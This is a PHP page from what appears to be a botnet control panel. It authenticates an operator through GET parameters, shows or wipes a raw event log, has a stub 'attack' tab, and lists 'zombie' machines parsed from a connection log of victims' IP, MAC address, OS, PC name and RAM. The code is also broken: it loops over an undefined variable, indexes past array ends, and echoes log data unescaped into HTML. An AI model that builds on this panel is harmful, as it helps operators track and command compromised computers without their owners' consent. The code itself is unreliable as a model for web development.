<?php
include 'static/config.php';
include 'api/core.php';

error_reporting(E_ALL ^ (E_NOTICE | E_WARNING));
$user_ip = $Secure -> RetrieveIP();

if ((isset ($_GET["log"])) && (isset ($_GET["sid"])) && (isset ($_GET["tab"]))) {
	$info_log = $_GET["log"];
	$info_sid = $_GET["sid"];
	$info_tab = $_GET["tab"];

	if ($DB -> CheckLog($info_log)) {
		if (($Secure -> CheckSID($info_sid, $DB -> GetMDP($info_log)))==true) {
			switch ($info_tab) {
				case "log":
					if (!isset($_GET['act'])) {
						$logdata = file ("task/rawlog/rawlog.txt");
						$row_log = count ($logdata);
						$row_end = floor($row_log/7);
						if ($logdata != false) {
							global $htmlog;
							if ($row_log>7) {
								for($i=$row_log;$i>0;$i--){
									$data = $logdata[$i];
									list($date, $type, $ip, $error) = explode("|", $data);
									switch ($type) {
										case "#0":
											$htmlog .= '<div class = "lowlevel loginfo">&nbsp;<font face = "Arial" size = "4" color ="#EEEEEE">'.$ip.'</font>&nbsp;&nbsp;&nbsp;<font face ="Arial Black" size = "4">'.$date.'</font>&nbsp;&nbsp;<font face = "Arial" size = "4">'.$error.'</font></div>';
										break;
										case "#1":
											$htmlog .= '<div class = "midlevel loginfo">&nbsp;<font face = "Arial" size = "4" color ="#EEEEEE">'.$ip.'</font>&nbsp;&nbsp;&nbsp;<font face ="Arial Black" size = "4">'.$date.'</font>&nbsp;&nbsp;<font face = "Arial" size = "4">'.$error.'</font></div>';
										break;
										case "#2":
											$htmlog .= '<div class = "highlevel loginfo">&nbsp;<font face = "Arial" size = "4" color ="#EEEEEE">'.$ip.'</font>&nbsp;&nbsp;&nbsp;<font face ="Arial Black" size = "4">'.$date.'</font>&nbsp;&nbsp;<font face = "Arial" size = "4">'.$error.'</font></div>';
										break;
									}
								}
							}
							else {
								for($i=$row_log;$i>0;$i--){
									$data = $logdata[$i];
									list($date, $type, $ip, $error) = explode("|", $data);
									switch ($type) {
										case "#0":
											$htmlog .= '<div class = "lowlevel loginfo">&nbsp;<font face = "Arial" size = "4" color ="#EEEEEE">'.$ip.'</font>&nbsp;&nbsp;&nbsp;<font face ="Arial Black" size = "4">'.$date.'</font>&nbsp;&nbsp;<font face = "Arial" size = "4">'.$error.'</font></div>';
										break;
										case "#1":
											$htmlog .= '<div class = "midlevel loginfo">&nbsp;<font face = "Arial" size = "4" color ="#EEEEEE">'.$ip.'</font>&nbsp;&nbsp;&nbsp;<font face ="Arial Black" size = "4">'.$date.'</font>&nbsp;&nbsp;<font face = "Arial" size = "4">'.$error.'</font></div>';
										break;
										case "#2":
											$htmlog .= '<div class = "highlevel loginfo">&nbsp;<font face = "Arial" size = "4" color ="#EEEEEE">'.$ip.'</font>&nbsp;&nbsp;&nbsp;<font face ="Arial Black" size = "4">'.$date.'</font>&nbsp;&nbsp;<font face = "Arial" size = "4">'.$error.'</font></div>';
										break;
									}
								}
							}
						}
						else {
							$htmlog = '</br><font face = "Arial" color = "#f10400" size = "3">&nbsp;&nbsp;&nbsp;Empty log.</font>';
						}
					}
					else {
						$clearhandle = fopen('task/rawlog/rawlog.txt',"w");
						ftruncate($clearhandle,0);
						$htmlog = '</br><font face = "Arial" color = "#00bd00" size = "3">&nbsp;&nbsp;&nbsp;Log cleared.</font>';
					}
					$HTML -> PrintUser ($info_sid, $info_log, $info_tab, $htmlog, $row_end);
					echo $row_end;
				break;
				case "attack":
					if (isset ($_POST["update"])) {

					}
					$HTML -> PrintUser ($info_sid, $info_log, $info_tab);
				break;
				case "zomb":
					$logdata = file ("task/connexions/connectdumper.log");
						if ($logdata != false) {
							global $htmdat;
							for($i=$row_log;$i>0;$i--){
								$data = $logdata[$i];
								list($ip, $lang, $localgateway, $os, $macadr, $archetype, $pcname, $ram, $ip, $sid) = explode("|", $data);
								$htmdat .= '<div class = "zombbar"></div>';
							}
						}
						else {

						}
					$HTML -> PrintUser ($info_sid, $info_log, $info_tab, $htmdat);
				break;
			}
		}
		else {
			$Secure -> WriteLog ($user_ip, '#1', 'CSRF MDOS attack attempt OR expired session. (a bad secure id given on user page)');
			$Secure -> Redirect(SYS_URL.'/index.php?session=0');
			exit;
		}
	}
	else {
		$Secure -> WriteLog ($user_ip, '#2', 'CSRF MDOS attack attempt. (a bad log given on user page)');
		$Secure -> Redirect (SYS_URL);
		exit;
	}
}
else {
		$Secure -> WriteLog ($user_ip, '#1', 'CSRF MDOS attack attempt. (no parameters calling user page)');
		$Secure -> Redirect (SYS_URL);
		exit;
}
?>